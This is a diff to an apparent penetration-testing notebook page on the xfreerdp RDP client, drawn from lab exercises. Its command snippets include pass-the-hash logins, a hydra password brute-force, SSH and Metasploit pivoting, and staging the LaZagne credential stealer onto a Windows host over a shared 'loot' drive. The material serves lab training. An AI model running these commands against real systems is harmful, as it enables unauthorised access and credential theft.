@@ -9,6 +9,95 @@ hideFooterPagination: true
 
 {/* Generated from Commands/xfreerdp.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## xfreerdp: choose the operation and read the result
+
+Connect to an RDP desktop; optional drive sharing moves files.
+
+### What the result establishes
+
+A displayed desktop proves an RDP logon for that identity; inspect the remote session and privileges afterward.
+
+### Prerequisites and common failures
+
+Match the installed FreeRDP syntax and authentication mechanism; RDP logon rights, NLA, TLS trust and account restrictions are independent checks.
+
+### Example 1: Commands
+
+Run in: **Kali**. Some Kali installs name the client xfreerdp3. Use the installed launcher; verify the server certificate.
+
+```bash
+xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD'
+# Share a local folder with the RDP session
+xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' /drive:kali,/home/kali/transfer
+```
+
+### Example 2: RDP File Transfers
+
+Run in: **Saved lab example**.
+
+```bash
+xfreerdp /v:<IP> /d:<DOMAIN> /u:<USER> /p:'<PASS>' /drive:linux,/home/user/transfer
+```
+
+Saved context: [File Transfers for Linux and Windows — RDP File Transfers](/post-exploitation/file-transfers-cheat-sheet#rdp-file-transfers). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: RDP File Transfers
+
+Run in: **Saved lab example**.
+
+```bash
+rdesktop <IP> -d <DOMAIN> -u <USER> -p '<PASS>' -r disk:linux='/home/user/transfer'
+```
+
+Saved context: [File Transfers for Linux and Windows — RDP File Transfers](/post-exploitation/file-transfers-cheat-sheet#rdp-file-transfers). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: RDP — PtH for GUI access (xfreerdp)
+
+Run in: **Saved lab example**.
+
+```bash
+xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+```
+
+Saved context: [Pass the Hash from Linux and Windows — RDP — PtH for GUI access (xfreerdp)](/password-attacks/pass-the-hash#rdp-—-pth-for-gui-access-xfreerdp). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: RDP (3389)
+
+Run in: **Saved lab example**.
+
+```bash
+hydra -L user.list -P password.list rdp://10.129.42.197
+xfreerdp /v:10.129.42.197 /u:user /p:password     # connect with GUI
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — RDP (3389)](/password-attacks/password-attacks-cheat-sheet#rdp-3389). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)
+
+Run in: **Saved lab example**.
+
+```bash
+ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
+```
+
+Saved context: [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: 11. File transfer over a pivot
+
+Run in: **Saved lab example**.
+
+```bash
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore /drive:kali,/home/kali/loot
+#   inside Windows:  copy \\tsclient\kali\Windows\LaZagne.exe C:\Users\Public\
+```
+
+Saved context: [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Connect to an RDP desktop; optional drive sharing moves files.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=xfreerdp) · [All tools](/index)
@@ -22,6 +111,13 @@ xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD'
 # Share a local folder with the RDP session
 xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' /drive:kali,/home/kali/transfer
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Example 1: Commands](/enumeration/windows-remote-management-protocols-cheat-sheet#example-1-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 Some Kali installs name the client xfreerdp3. Use the installed launcher; verify the server certificate.
 
@@ -44,6 +140,13 @@ xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore /drive:kali,/home/k
 #   inside Windows:  copy \\tsclient\kali\Windows\LaZagne.exe C:\Users\Public\
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot) · [Windows Remote Access: RDP, WinRM, and WMI — Example 7: 11. File transfer over a pivot](/enumeration/windows-remote-management-protocols-cheat-sheet#example-7-11-file-transfer-over-a-pivot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)">
@@ -65,12 +168,26 @@ nxc smb 172.16.119.11 -u user -p pass
 xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 ```bash
 ssh -L 13389:172.16.119.7:3389 jbetty@&lt;DMZ_IP>     # then RDP to 127.0.0.1:13389 (no proxychains)
 xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/cheatsheets/ad-attack-path-worked-example#option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools) · [Windows Remote Access: RDP, WinRM, and WMI — Example 6: Option B — ligolo‑ng (transparent TUN — best for RDP/GUI tools)](/enumeration/windows-remote-management-protocols-cheat-sheet#example-6-option-b-—-ligolo‑ng-transparent-tun-—-best-for-rdp/gui-tools)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -103,6 +220,13 @@ grcic550@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking RDP: Module Notes — Adding the DisableRestrictedAdmin Registry Key](/modules/common-services/rdp#adding-the-disablerestrictedadmin-registry-key)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="RDP Login">
@@ -125,6 +249,13 @@ the following identified reasons(s);
 Review the following certificate info before you trust it to be added as an exception.
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Attacking RDP: Module Notes — RDP Login](/modules/common-services/rdp#rdp-login)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Misconfigurations">
@@ -144,6 +275,13 @@ the following identified reasons(s);
  1. Certificate issuer is not trusted by this system.
      Issuer: CN=WIN-Q8F2KTAI43A
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Misconfigurations](/modules/common-services/full-reference#misconfigurations-4)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -176,6 +314,13 @@ grcic550@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8
 <SNIP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — RDP Pass-the-Hash (PtH)](/modules/common-services/full-reference#rdp-pass-the-hash-pth)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="RDP File Transfers">
@@ -188,11 +333,25 @@ grcic550@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8
 xfreerdp /v:<IP> /d:<DOMAIN> /u:<USER> /p:'<PASS>' /drive:linux,/home/user/transfer
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Example 2: RDP File Transfers](/enumeration/windows-remote-management-protocols-cheat-sheet#example-2-rdp-file-transfers) · [File Transfers for Linux and Windows — RDP File Transfers](/post-exploitation/file-transfers-cheat-sheet#rdp-file-transfers)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```bash
 rdesktop <IP> -d <DOMAIN> -u <USER> -p '<PASS>' -r disk:linux='/home/user/transfer'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Example 3: RDP File Transfers](/enumeration/windows-remote-management-protocols-cheat-sheet#example-3-rdp-file-transfers) · [File Transfers for Linux and Windows — RDP File Transfers](/post-exploitation/file-transfers-cheat-sheet#rdp-file-transfers)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -214,6 +373,13 @@ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
 ./rdp-sec-check.pl <IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — RDP (Port 3389)](/enumeration/footprinting-lab-methodology-cheat-sheet#rdp-port-3389)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="RDP — PtH for GUI access (xfreerdp)">
@@ -225,6 +391,13 @@ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
 ```bash
 xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Example 4: RDP — PtH for GUI access (xfreerdp)](/enumeration/windows-remote-management-protocols-cheat-sheet#example-4-rdp-—-pth-for-gui-access-xfreerdp) · [Pass the Hash from Linux and Windows — RDP — PtH for GUI access (xfreerdp)](/password-attacks/pass-the-hash#rdp-—-pth-for-gui-access-xfreerdp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -238,6 +411,13 @@ xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 hydra -L user.list -P password.list rdp://10.129.42.197
 xfreerdp /v:10.129.42.197 /u:user /p:password     # connect with GUI
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Example 5: RDP (3389)](/enumeration/windows-remote-management-protocols-cheat-sheet#example-5-rdp-3389) · [Password Attacks: Cracking, Files, and Credential Stores — RDP (3389)](/password-attacks/password-attacks-cheat-sheet#rdp-3389)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -260,6 +440,13 @@ xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore     # no proxychain
 # Remote (-R): make a Kali service reachable FROM the pivot side (reverse)
 ssh -R 8000:127.0.0.1:8000 jbetty@<DMZ_IP>      # DMZ's :8000 -> Kali's :8000
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 1. SSH port forwarding (no tools needed)](/cheatsheets/pivoting-file-transfer#1-ssh-port-forwarding-no-tools-needed)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -288,6 +475,13 @@ xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'...' /cert:ignore
 nmap -sT 172.16.119.0/24
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 3. ligolo‑ng (transparent TUN — best for RDP/scanning)](/cheatsheets/pivoting-file-transfer#3-ligolo‑ng-transparent-tun-—-best-for-rdp/scanning)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Downloading TO a Windows target">
@@ -308,6 +502,13 @@ copy \\172.16.119.13\share\tool.exe C:\Users\Public\
 copy \\tsclient\kali\tool.exe C:\Users\Public\
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Windows target](/cheatsheets/pivoting-file-transfer#downloading-to-a-windows-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2 · Metasploit routing (pivot through a session)">
@@ -325,6 +526,13 @@ route print                             # verify
 use auxiliary/server/socks_proxy        # SRVPORT 9050, VERSION 5, run -j
 # then proxychains (socks5 127.0.0.1 9050) your nmap/xfreerdp/etc.
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — 2 · Metasploit routing (pivot through a session)](/modules/pivoting-tunneling-port-forwarding#2-·-metasploit-routing-pivot-through-a-session)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -345,6 +553,13 @@ xfreerdp /u:<user> /p:"<pass>" /v:<IP> /dynamic-resolution
 rdesktop -u <user> -p <pass> <IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Remote Access: RDP, WinRM, and WMI — Security check & connecting](/enumeration/windows-remote-management-protocols-cheat-sheet#security-check-&-connecting)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="WinRM and RDP">
@@ -362,6 +577,13 @@ command -v xfreerdp3
 command -v xfreerdp
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows remote execution by service — WinRM and RDP](/tools/windows-remote-execution#winrm-and-rdp)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Group &amp; access edges">
@@ -375,6 +597,13 @@ Context from the notebook: CanRDP You may RDP to that host xfreerdp3 /v:&lt;host
 ```text
 xfreerdp3 /v:<host> /u:u /p:'p'
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — Group & access edges](/cheatsheets/bloodhound-complete-guide#group-&-access-edges)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -390,6 +619,13 @@ Context from the notebook: xfreerdp: Cannot find KDC for realm INLANEFREIGHT.LOC
 xfreerdp: Cannot find KDC for realm INLANEFREIGHT.LOCAL
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Certificate: PKINIT and Lab Walkthrough — Troubleshooting log (everything that bit me, and the fix)](/password-attacks/pass-the-certificate#troubleshooting-log-everything-that-bit-me-and-the-fix)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Windows Remote Access">
@@ -404,6 +640,21 @@ Context from the notebook: RDP 3389 GUI desktop xfreerdp /u:&lt;user> /p:&lt;pas
 xfreerdp /u:<user> /p:<pass> /v:<IP>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Windows Remote Access](/reference/master-protocol-service-quick-reference#windows-remote-access)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
